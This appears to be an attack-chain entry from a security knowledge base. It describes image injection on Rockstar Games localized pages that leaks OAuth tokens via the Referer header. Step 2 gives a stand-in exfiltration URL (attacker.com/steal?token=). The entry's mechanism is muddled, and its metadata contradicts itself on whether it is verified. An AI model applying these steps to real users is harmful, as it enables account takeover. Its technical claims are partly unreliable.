---
id: ac-uuid-1234
name: >-
  Image Injection via Referer Header in Rockstar Games Localized Pages Leading
  to OAuth Token Theft
tags:
  - image-injection
  - referer-header
  - oauth-theft
  - phishing
  - information-disclosure
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Identify-Image-Injection-Vulnerability-in-Localized-Pages]]'
  - '[[procedures/Construct-Attack-Chain-for-OAuth-Token-Theft]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:24:35.121Z'
description: >-
  An attack chain exploiting image injection in localized Rockstar Games website
  pages to manipulate the Referer header, enabling phishing or theft of
  sensitive OAuth tokens like Facebook tokens.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
---
# Image Injection via Referer Header in Rockstar Games Localized Pages Leading to OAuth Token Theft

Multi-stage attack chain demonstrating exploitation of image injection in the localized games/info section of the Rockstar Games website to include arbitrary URLs in the Referer header, facilitating phishing attacks or theft of sensitive user tokens such as Facebook OAuth tokens, resulting in information disclosure.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Identify Image Injection] --> B[Construct Token Theft Chain]
    B --> C[Information Disclosure]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Browser developer tools for testing
- Proxy tool like Burp Suite for header manipulation

### Target Environment

- Web platform
- Access to Rockstar Games localized pages (e.g., /br/games/info)
- No specific ports or services required beyond standard HTTPS

### Initial Access Requirements

- Public access to the website
- No credentials needed
- Ability to load localized URLs

## Detailed Attack Procedures

### Step 1: Identify Image Injection Vulnerability
procedure: [[procedures/Identify-Image-Injection-Vulnerability-in-Localized-Pages]]

**Objective**: Locate and confirm the image injection point in localized pages that allows arbitrary URL inclusion in the Referer header.

**Instructions**: Navigate to a localized games/info page such as https://www.rockstargames.com/br/#/games/info. Use browser developer tools or a proxy to inspect image source attributes and test for injection by modifying src to include external URLs. Verify if the full URL is sent in the Referer header during image load.

**Expected Output**: Confirmation that arbitrary URLs are loaded and their full paths appear in the Referer header sent to the external server.

**Success Indicators**:
- Image loads from injected URL
- Server logs or proxy capture shows full Referer header with injected URL

### Step 2: Construct Attack Chain for Token Theft
procedure: [[procedures/Construct-Attack-Chain-for-OAuth-Token-Theft]]

**Objective**: Build an exploit chain using the injection to steal sensitive tokens via phishing or direct exfiltration through manipulated Referer headers.

**Instructions**: Craft a malicious image src pointing to an attacker-controlled server (e.g., https://attacker.com/steal?token=). Embed this in the vulnerable page via injection. When a victim loads the page, the Referer header will include the full malicious URL, potentially leaking session or OAuth tokens if the victim is authenticated with linked services like Facebook.

**Expected Output**: Attacker server receives Referer header containing leaked tokens or phishing prompts.

**Success Indicators**:
- Receipt of Referer headers with sensitive data
- Successful phishing lure or token capture leading to account compromise

## Attack Chain Summary

### Key Achievements

1. Identification of image injection flaw in localized endpoints
2. Manipulation of Referer header for arbitrary URL inclusion
3. Enablement of phishing or OAuth token theft resulting in information disclosure

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Drive-by Compromise]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
